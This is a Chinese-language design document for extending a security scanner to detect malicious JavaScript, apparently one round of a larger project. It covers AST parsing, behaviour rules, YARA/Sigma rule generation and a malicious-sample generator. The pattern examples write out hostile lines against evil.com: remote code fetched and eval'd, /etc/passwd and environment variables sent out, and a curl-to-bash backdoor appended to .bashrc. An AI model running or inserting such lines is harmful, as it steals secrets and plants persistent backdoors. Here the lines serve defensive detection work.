# Round 20: JavaScript 支持 - 设计文档

**状态**: 🔄 进行中  
**启动时间**: 2026-03-24 20:00  
**预计完成**: 1-2 天

---

## 🎯 目标

支持 JavaScript/Node.js 脚本的安全检测，达到与 Python 相当的检测深度。

---

## 📋 核心需求

### 功能需求

| 需求 | 说明 | 优先级 |
|------|------|--------|
| **JS 词法分析** | Token 级别特征提取 | 🔴 高 |
| **JS 语法分析** | AST 抽象语法树解析 | 🔴 高 |
| **JS 行为分析** | 语义级别行为识别 | 🔴 高 |
| **JS 规则匹配** | YARA/Sigma/IOC 规则 | 🔴 高 |
| **JS 样本生成** | 50+ 恶意 JS 样本 | 🔴 高 |

### 性能需求

- 单文件扫描 P99 < 5ms
- 检测率 ≥ 98%
- 误报率 < 2%

---

## 🏗️ 技术架构

### JS 分析器架构

```
JavaScript 文件
    ↓
词法分析 (tokenizer)
    ↓
语法分析 (acorn/esprima AST)
    ↓
AST 遍历 (ast.Walker)
    ↓
行为特征提取
    ↓
风险评分
    ↓
检测结果
```

### 技术选型

| 组件 | 选型 | 说明 |
|------|------|------|
| **AST 解析** | acorn (npm) | 轻量、快速、支持最新 ES |
| **Python 绑定** | py_mini_racer / js2py | Python 调用 JS 库 |
| **备选方案** | esprima | 成熟稳定 |
| **纯 Python** | slimit (已废弃) | 不推荐 |

**推荐方案**: 使用 `acorn` + `py_mini_racer` 调用

---

## 🔍 检测能力设计

### 1. 危险 API 调用检测

```javascript
// 代码执行
eval(code)
Function(code)()
setTimeout(code, 0)
setInterval(code, 0)

// 进程执行
child_process.exec(cmd)
child_process.spawn(cmd)
child_process.execSync(cmd)

// 文件操作
fs.readFileSync(path)
fs.writeFileSync(path, data)
fs.unlinkSync(path)  // 删除

// 网络请求
http.get(url)
https.request(options)
fetch(url)
axios.get(url)

// 动态加载
require(module)
import(module)
```

### 2. 混淆代码检测

```javascript
// 字符串混淆
var _0xabc = ['eval', 'exec'];
var fn = window[_0xabc[0]];

// Base64 编码
var code = atob('Y29uc29sZS5sb2coIkhlbGxvIik=');
eval(code);

// 十六进制编码
var code = '\x65\x76\x61\x6c';  // "eval"

// 变量名混淆
var _0x1a2b3c = function() { /* malicious code */ };
```

### 3. 恶意行为模式

```javascript
// 1. 远程代码加载
http.get('http://evil.com/malware.js', (res) => {
    eval(res.data);
});

// 2. 数据外传
fs.readFile('/etc/passwd', (err, data) => {
    http.post('http://evil.com/collect', { data });
});

// 3. 持久化
fs.writeFileSync(
    require('os').homedir() + '/.bashrc',
    'curl http://evil.com/backdoor.sh | bash'
);

// 4. 环境变量窃取
const env = process.env;
http.post('http://evil.com/steal', { env });

// 5. 命令注入
const userInput = process.argv[2];
child_process.exec('echo ' + userInput);  // 危险！
```

---

## 📁 文件结构

```
round20/
├── ROUND20_DESIGN.md           # 设计文档 (本文件)
├── js_analyzer.py              # JS 分析器核心
├── js_tokenizer.py             # JS 词法分析
├── js_ast_parser.py            # JS AST 解析
├── js_behavior_extractor.py    # JS 行为特征提取
├── js_sample_generator.py      # JS 样本生成器
├── js_rules_generator.py       # JS 规则生成器
├── test_js_analyzer.py         # 测试脚本
└── reports/
    └── ROUND20_REPORT.md       # 完成报告

analyzers/
└── js_analyzer.py              # 集成到主扫描器

samples/
└── js_malicious/               # 50+ JS 恶意样本
    ├── command_execution_001.js
    ├── code_injection_001.js
    ├── data_exfil_001.js
    └── ...

rules/
├── js_yara_rules.yaml          # JS YARA 规则
├── js_sigma_rules.yaml         # JS Sigma 规则
└── js_ioc_rules.json           # JS IOC 指标
```

---

## 📊 攻击类型映射 (MITRE ATLAS)

| 攻击类型 | JS 示例 | 检测特征 |
|----------|---------|----------|
| **代码注入** | `eval(userInput)` | eval/Function 调用 |
| **命令执行** | `exec(cmd)` | child_process 调用 |
| **文件读取** | `fs.readFileSync()` | fs 模块敏感 API |
| **文件写入** | `fs.writeFileSync()` | fs 写操作 |
| **数据外传** | `http.post(evil, data)` | 网络 + 敏感数据 |
| **远程加载** | `http.get(evil, eval)` | 网络 + 代码执行 |
| **持久化** | 写入启动脚本 | 文件写 + 系统路径 |
| **凭证窃取** | `process.env` | 环境变量访问 |
| **混淆执行** | Base64 + eval | 编码 + 代码执行 |
| **原型污染** | `obj.__proto__` | 原型链修改 |

---

## 🚀 实施步骤

### Step 1: 环境准备

```bash
# 安装 acorn (Node.js AST 解析器)
npm install acorn acorn-walk

# 安装 Python JS 运行环境
pip install py-mini-racer

# 创建目录
mkdir -p round20 samples/js_malicious rules
```

### Step 2: 实现 JS 词法分析器

```python
# js_tokenizer.py
import re

class JSTokenizer:
    def __init__(self):
        self.dangerous_tokens = [
            'eval', 'Function', 'exec', 'spawn',
            'setTimeout', 'setInterval',
            'require', 'import',
            # ... 更多危险 token
        ]
    
    def tokenize(self, code: str) -> list:
        # 词法分析
        pass
    
    def find_dangerous_tokens(self, tokens: list) -> list:
        # 查找危险 token
        pass
```

### Step 3: 实现 JS AST 解析器

```python
# js_ast_parser.py
from py_mini_racer import py_mini_racer
import json

class JSASTParser:
    def __init__(self):
        self.acorn = """
        const acorn = require('acorn');
        const walk = require('acorn-walk');
        
        function parseJS(code) {
            return JSON.stringify(acorn.parse(code, { ecmaVersion: 2020 }));
        }
        """
        self.vm = py_mini_racer.MiniRacer()
        self.vm.eval(self.acorn)
    
    def parse(self, code: str) -> dict:
        ast_json = self.vm.call('parseJS', code)
        return json.loads(ast_json)
    
    def find_call_nodes(self, ast: dict) -> list:
        # 查找所有调用节点
        pass
    
    def find_dangerous_patterns(self, ast: dict) -> list:
        # 查找危险模式
        pass
```

### Step 4: 实现行为特征提取器

```python
# js_behavior_extractor.py
class JSBehaviorExtractor:
    def __init__(self):
        self.behavior_rules = {
            'code_execution': ['eval', 'Function', 'setTimeout'],
            'command_execution': ['exec', 'spawn', 'execSync'],
            'file_read': ['readFileSync', 'readFile'],
            'file_write': ['writeFileSync', 'writeFile'],
            'network': ['http.get', 'https.request', 'fetch', 'axios'],
            'dynamic_load': ['require', 'import'],
            # ...
        }
    
    def extract(self, ast: dict) -> list:
        behaviors = []
        # 遍历 AST，匹配行为规则
        return behaviors
    
    def risk_score(self, behaviors: list) -> float:
        # 计算风险评分
        pass
```

### Step 5: 生成测试样本

```python
# js_sample_generator.py
class JSSampleGenerator:
    def __init__(self):
        self.attack_templates = {
            'command_execution': [
                "const {{exec}} = require('child_process'); {{exec}}('{{cmd}}');",
                # ...
            ],
            # ... 其他攻击类型
        }
    
    def generate_samples(self, output_dir: str, count: int = 50):
        # 生成 50+ 恶意样本
        pass
```

### Step 6: 生成检测规则

```python
# js_rules_generator.py
class JSRulesGenerator:
    def generate_yara_rules(self, samples: list) -> str:
        # 生成 YARA 规则
        pass
    
    def generate_sigma_rules(self, samples: list) -> str:
        # 生成 Sigma 规则
        pass
    
    def generate_ioc_rules(self, samples: list) -> dict:
        # 生成 IOC 指标
        pass
```

### Step 7: 集成测试

```python
# test_js_analyzer.py
def test_js_analyzer():
    analyzer = JSAnalyzer()
    
    # 测试恶意样本
    malicious_samples = load_samples('samples/js_malicious')
    for sample in malicious_samples:
        result = analyzer.scan(sample)
        assert result.is_malicious == True
    
    # 测试白样本
    safe_samples = load_samples('samples/js_safe')
    for sample in safe_samples:
        result = analyzer.scan(sample)
        assert result.is_malicious == False
    
    print("✅ All tests passed!")
```

---

## 📊 验收标准

### 功能验收

- [ ] 能正确解析 JS 代码 AST
- [ ] 能检测 10 种攻击类型
- [ ] 能识别常见混淆手法
- [ ] 能生成检测报告

### 性能验收

- [ ] 单文件扫描 P99 < 5ms
- [ ] 批量扫描 (100 文件) < 2s
- [ ] 内存占用 < 200MB

### 质量验收

- [ ] 检测率 ≥ 98%
- [ ] 误报率 < 2%
- [ ] 50+ 测试样本全部通过

---

## 📝 依赖安装

```bash
# Node.js 依赖
cd ~/.openclaw/workspace/agent-security-skill-scanner-V3
npm init -y
npm install acorn acorn-walk

# Python 依赖
pip install py-mini-racer
pip install js2py  # 备选方案
```

---

## ⏱️ 时间计划

| 步骤 | 内容 | 预计时间 |
|------|------|----------|
| Step 1 | 环境准备 | 30 分钟 |
| Step 2 | JS 词法分析 | 2 小时 |
| Step 3 | JS AST 解析 | 4 小时 |
| Step 4 | 行为特征提取 | 3 小时 |
| Step 5 | 样本生成 | 2 小时 |
| Step 6 | 规则生成 | 2 小时 |
| Step 7 | 集成测试 | 3 小时 |
| **总计** | | **16 小时 (2 天)** |

---

## 🎯 下一步

**立即开始 Step 1: 环境准备**

```bash
npm install acorn acorn-walk
pip install py-mini-racer
```

**准备启动！** 🚀
